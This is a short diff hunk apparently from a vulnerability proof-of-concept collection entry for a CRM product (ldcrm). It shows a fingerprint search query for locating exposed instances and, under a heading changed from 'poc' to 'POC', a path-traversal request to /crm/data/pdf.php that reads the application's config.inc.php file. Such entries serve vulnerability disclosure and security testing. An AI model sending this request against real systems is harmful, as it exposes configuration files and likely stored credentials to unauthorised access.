@@ -8,7 +8,7 @@
 body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js")
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /crm/data/pdf.php?url=../config.inc.php HTTP/1.1
